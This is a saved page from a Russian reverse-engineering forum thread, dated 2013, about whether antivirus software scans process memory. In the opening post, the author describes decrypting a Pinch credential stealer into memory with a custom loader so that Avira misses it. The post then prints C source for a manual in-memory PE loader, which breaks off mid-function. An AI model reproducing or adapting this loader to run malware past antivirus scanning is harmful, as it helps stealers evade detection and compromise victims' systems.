<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>А проверяют ли антивирусы память? - eXeL@B</title>
<meta NAME="DESCRIPTION" CONTENT="В общем, не специалист я в этой области, но меня удивила одна тема. Взял я в экспериментальных целях образ прекрасно детектящегося любым АВ пинча, написал декриптор и загрузчик. Делается все приблизительно так: загрузчик читает">
<meta NAME="KEYWORDS" CONTENT="x64_dbg windbg ollydbg ida скачать взлом отладчик ассемблер дизассемблер крэкер cracker реверсер keygen кейген кодер патч патчер крэкми лоадер брутфорсер протектор распаковщик пароль ключ ключфайл шпион oep key защита программа winapi faq hiew windasm softice winhex">
<META NAME="Document-state" CONTENT="Dynamic">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<link rel="SHORTCUT ICON" href="/favicon.ico">
<meta name="viewport" content="width=device-width">
<link href="./skin/s0.css" type="text/css" rel="STYLESHEET">
<link href="./skin/code.css" type="text/css" rel="STYLESHEET">
<script type="text/javascript" src="./js/jq.js"></script>
<link rel="alternate" type="application/rss+xml" title="eXeL@B" href="./rss.php">
<style type="text/css">.username div .dops{display:none;}</style>
<link href="../menu.css" type="text/css" rel="stylesheet">
</head>

<body>
<a id="to_top"></a>
<div id="wrapper">
 
<div class="mob-hamburger"><span></span></div>
 
</center></div><script type='text/javascript'>
function lst(){var i=0;var htm='';var a='';var timer=setInterval(function(){if(i<10){i=i+10;}else{clearInterval(timer);i=0;}document.getElementById('kurs_container').style.marginLeft='-'+i+'px';},100);}
document.addEventListener('DOMContentLoaded',function(event){setTimeout(lst,1500);setInterval(lst,10000);});
</script></div></div>
<script type="text/javascript">
jQuery(document).ready(function(){
    jQuery(".mob-hamburger").on("click", function() {
        jQuery(".mob-hamburger").toggleClass("active");
        jQuery("#site-navigation").slideToggle();
		if (jQuery('.mob-hamburger').hasClass('active')) {
			var i = jQuery('#site-navigation').offset().top;
		} else { 
			var i = 0;
		}
			
		jQuery("html, body").animate({ scrollTop: i }, 600);
    });
	var btn = jQuery('#to_top');
	jQuery(window).scroll(function() {
		if (jQuery(window).scrollTop() > 300) {
			btn.addClass('show');
		} else {
			btn.removeClass('show');
		}
	});
	btn.on('click', function(e) {
		e.preventDefault();
		jQuery('html, body').animate({scrollTop:0}, '300');
	});
});
</script>
 
<div id="content">
<div align=center style="margin-top:15px">

<table class=tbTransparent>
<tr><td class=tbTransparent>
<span class=txtSm>Сейчас на форуме: <b><a target='_blank' href='?action=userinfo&amp;user=55914'>Kybyx</a> (+4 невидимых)</b></span>
</td>
</tr>
</table>

 

</div><br>
<script language="javascript" type="text/javascript" charset="windows-1251" src="templates/base.js"></script>

<div align=center><table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/mod.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=7&sortBy=0&page=0.html"><b>Оффтоп</b></a> <b class=bulletHead>&#8212;&#8250;</b> А проверяют ли антивирусы память?</span></td>
</tr></table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> .  <b>1</b> . <a href="action=vthread&amp;forum=7&amp;topic=22241&amp;page=1.html">2</a> . <a href="action=vthread&amp;forum=7&amp;topic=22241&amp;page=1.html">&gt;&gt;</a></b></span></td></tr></table>
<table class=forums><tr>
<td width="15%" class=caption4><span class=txtSm><b>Посл.ответ</b></span></td>
<td width="85%" class=caption4><span class=txtSm><b>Сообщение</b></span></td></tr>
<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="1" onfocus="this.blur()" href="JavaScript:di('[b]Crawler[/b]','')">Crawler</a></b><br></div>
<img src="img/s6.gif" alt=""><br><img style="padding-top:3px;" src="av/4825.jpg" alt=""><br><span class=txtSm>Ранг: 216.9 (наставник), 85thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.15'>Активность: 0.31<span style='color:red'>&searr;</span>0.15</span><br>Статус: <a href="action=userinfo&amp;user=4825">Участник</a><br><font color=blue>X-Literator</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 09 октября 2013 13:22 <br><script type="text/javascript">QU('Crawler','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Crawler" target="_blank">Личное сообщение</a> &middot;  <a href="#1" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=7&amp;topic=22241&amp;page=0#1');return false;">#1</a> </span><div align=left><br>
В общем, не специалист я в этой области, но меня удивила одна тема.<br><br>Взял я в экспериментальных целях образ прекрасно детектящегося любым АВ пинча, написал декриптор и загрузчик. Делается все приблизительно так: загрузчик читает из зашифрованного файла в массив, потом расшифровывает его в памяти. И вот в этот самый момент и проверяется память всех процессов. Авира не находит ничего подозрительного, хотя если посмотреть отладчиком, видно, что в памяти образ пинча, ничем не зашифрованного. Ничего не понимаю. Даже если загрузить вирусняк в память кодом, который ниже, все равно ничего не детектится.<br><br>
<div class="hl_container">
<div class="hl_header">Code:</div>
<div class="hl_scroll_part_large">
    <div class="hl_normal"> 
        <ol class="hl_main"><li class="hl_l0">#include&nbsp;<span class="hl_char">&lt;</span>Windows<span class="hl_char">.</span>h<span class="hl_char">&gt;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0"><span class="hl_function"><b>DWORD</b></span>&nbsp;GetSectionProtection<span class="hl_char">(</span><span class="hl_function"><b>DWORD</b></span>&nbsp;sc<span class="hl_char">)</span></li><li class="hl_l1">{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwResult<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_NOT_CACHED<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult&nbsp;<span class="hl_char">|</span><span class="hl_char">=</span>&nbsp;PAGE_NOCACHE<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_EXECUTE<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_READ<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_WRITE<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult&nbsp;<span class="hl_char">|</span><span class="hl_char">=</span>&nbsp;PAGE_EXECUTE_READWRITE<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult&nbsp;<span class="hl_char">|</span><span class="hl_char">=</span>&nbsp;PAGE_EXECUTE_READ<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>else</b></span>&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_WRITE<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult&nbsp;<span class="hl_char">|</span><span class="hl_char">=</span>&nbsp;PAGE_EXECUTE_WRITECOPY<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult&nbsp;<span class="hl_char">|</span><span class="hl_char">=</span>&nbsp;PAGE_EXECUTE<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_READ<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_WRITE<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult<span class="hl_char">|</span><span class="hl_char">=</span>PAGE_READWRITE<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult<span class="hl_char">|</span><span class="hl_char">=</span>PAGE_READONLY<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>else</b></span>&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>sc&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_SCN_MEM_WRITE<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult<span class="hl_char">|</span><span class="hl_char">=</span>PAGE_WRITECOPY<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">else</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dwResult<span class="hl_char">|</span><span class="hl_char">=</span>PAGE_NOACCESS<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;dwResult<span class="hl_comment">;</span></li><li class="hl_l0">}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">inline&nbsp;BOOL&nbsp;IsImportByOrdinal<span class="hl_char">(</span><span class="hl_function"><b>DWORD</b></span>&nbsp;ImportDescriptor<span class="hl_char">)</span></li><li class="hl_l0">{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_char">(</span>ImportDescriptor&nbsp;<span class="hl_char">&amp;</span>&nbsp;IMAGE_ORDINAL_FLAG32<span class="hl_char">)</span><span class="hl_char">!</span><span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">;</span></li><li class="hl_l0">}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">#ifndef&nbsp;MIN</li><li class="hl_l1">#define&nbsp;MIN<span class="hl_char">(</span>a<span class="hl_char">,</span>b<span class="hl_char">)</span>&nbsp;<span class="hl_char">(</span><span class="hl_char">(</span>a<span class="hl_char">)</span><span class="hl_char">&lt;</span><span class="hl_char">(</span>b<span class="hl_char">)</span><span class="hl_char">?</span><span class="hl_char">(</span>a<span class="hl_char">)</span><span class="hl_char">:</span><span class="hl_char">(</span>b<span class="hl_char">)</span><span class="hl_char">)</span></li><li class="hl_l0">#endif</li><li class="hl_l1">&nbsp;</li><li class="hl_l0"><span class="hl_char">/</span><span class="hl_char">/</span>typedef&nbsp;BOOL&nbsp;<span class="hl_char">(</span>WINAPI&nbsp;<span class="hl_char">*</span>pointMAIN<span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_function"><b>int</b></span>&nbsp;<span class="hl_char">,</span>&nbsp;<span class="hl_function">char</span><span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">typedef&nbsp;BOOL&nbsp;<span class="hl_char">(</span>WINAPI&nbsp;<span class="hl_char">*</span>pointWINMAIN<span class="hl_char">)</span><span class="hl_char">(</span>HINSTANCE<span class="hl_char">,</span>&nbsp;HINSTANCE<span class="hl_char">,</span>&nbsp;LPSTR<span class="hl_char">,</span>&nbsp;<span class="hl_function">int</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;</li><li class="hl_l1">HMODULE&nbsp;MemLoadExe<span class="hl_char">(</span>PBYTE&nbsp;<span class="hl_function">data</span><span class="hl_char">)</span></li><li class="hl_l0">{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_FILE_HEADER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">*</span>pFileHeader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_OPTIONAL_HEADER&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">*</span>pOptionalHeader&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_SECTION_HEADER&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">*</span>pSectionHeader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;IMAGE_IMPORT_DESCRIPTOR&nbsp;<span class="hl_char">*</span>pImportDscrtr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l1"><span style="word-break: break-all">&nbsp;&nbsp;&nbsp;&nbsp;USHORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e_lfanew&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="hl_char">=</span>&nbsp;<span class="hl_char">*</span><span class="hl_char">(</span><span class="hl_char">(</span>USHORT<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_function">data</span><span class="hl_char">+</span>0x3c<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0"><span style="word-break: break-all">&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageBase&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l1"><span style="word-break: break-all">&nbsp;&nbsp;&nbsp;&nbsp;PCHAR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionBase&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="hl_char">=</span>&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>DWORD</b></span>&nbsp;dwSize<span class="hl_char">,</span>&nbsp;dwOldProt<span class="hl_char">,</span>&nbsp;ImageBaseDelta<span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>int</b></span>&nbsp;i<span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;pFileHeader&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>IMAGE_FILE_HEADER&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_function">data</span><span class="hl_char">+</span>e_lfanew<span class="hl_char">+</span><span class="hl_number">4</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;pOptionalHeader&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>IMAGE_OPTIONAL_HEADER&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span><span class="hl_function">data</span><span class="hl_char">+</span>e_lfanew<span class="hl_char">+</span><span class="hl_number">4</span><span class="hl_char">+</span><span class="hl_function">sizeof</span><span class="hl_char">(</span>IMAGE_FILE_HEADER<span class="hl_char">)</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>Magic<span class="hl_char">!</span><span class="hl_char">=</span>IMAGE_NT_OPTIONAL_HDR32_MAGIC<span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;Let's try to reserv memory</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;ImageBase&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>PCHAR<span class="hl_char">)</span>VirtualAlloc<span class="hl_char">(</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">(</span>PVOID<span class="hl_char">)</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>ImageBase<span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>SizeOfImage<span class="hl_char">,</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_RESERVE<span class="hl_char">,</span>PAGE_NOACCESS<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span>ImageBase<span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_function">NULL</span><span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageBase<span class="hl_char">=</span><span class="hl_char">(</span>PCHAR<span class="hl_char">)</span>VirtualAlloc<span class="hl_char">(</span><span class="hl_function">NULL</span><span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>SizeOfImage<span class="hl_char">,</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_RESERVE<span class="hl_char">,</span>PAGE_NOACCESS<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function">if</span><span class="hl_char">(</span>ImageBase<span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_function">NULL</span><span class="hl_char">)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;<span class="hl_function"><b>NULL</b></span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;}</li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;copy&nbsp;the&nbsp;header</li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;SectionBase<span class="hl_char">=</span><span class="hl_char">(</span>PCHAR<span class="hl_char">)</span>VirtualAlloc<span class="hl_char">(</span>ImageBase<span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>SizeOfHeaders<span class="hl_char">,</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT<span class="hl_char">,</span>PAGE_READWRITE<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;memcpy<span class="hl_char">(</span>SectionBase<span class="hl_char">,</span><span class="hl_function">data</span><span class="hl_char">,</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>SizeOfHeaders<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;Do&nbsp;headers&nbsp;read<span class="hl_char">-</span>only&nbsp;<span class="hl_char">(</span>to&nbsp;be&nbsp;on&nbsp;the&nbsp;safe&nbsp;side<span class="hl_char">)</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;VirtualProtect<span class="hl_char">(</span>SectionBase<span class="hl_char">,</span>pOptionalHeader<span class="hl_char">-</span><span class="hl_char">&gt;</span>SizeOfHeaders<span class="hl_char">,</span>PAGE_READONLY<span class="hl_char">,</span><span class="hl_char">&amp;</span>dwOldProt<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l1">&nbsp;</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_char">/</span><span class="hl_char">/</span>&nbsp;&nbsp;&nbsp;&nbsp;find&nbsp;sections&nbsp;<span class="hl_char">.</span><span class="hl_char">.</span><span class="hl_char">.</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;pSectionHeader&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>IMAGE_SECTION_HEADER&nbsp;<span class="hl_char">*</span><span class="hl_char">)</span><span class="hl_char">(</span>pOptionalHeader<span class="hl_char">+</span><span class="hl_number">1</span><span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;<span class="hl_char">(</span>i<span class="hl_char">=</span><span class="hl_number">0</span><span class="hl_comment">; i&lt;pFileHeader-&gt;NumberOfSections; i++)</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;{</li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SectionBase&nbsp;<span class="hl_char">=</span>&nbsp;<span class="hl_char">(</span>PCHAR<span class="hl_char">)</span>VirtualAlloc<span class="hl_char">(</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ImageBase<span class="hl_char">+</span>pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>VirtualAddress<span class="hl_char">,</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pSectionHeader<span class="hl_char">[</span>i<span class="hl_char">]</span><span class="hl_char">.</span>Misc<span class="hl_char">.</span>VirtualSize<span class="hl_char">,</span></li><li class="hl_l1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT<span class="hl_char">,</span>PAGE_READWRITE<span class="hl_char">)</span><span class="hl_comment">;</span></li><li class="hl_l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hl_function"><b>if</b></span>&nbsp;<span class="hl_char">(</span>SectionBase<span class="hl_char">=</span><span class="hl_char">=</span><span class="hl_function">NULL</span><span 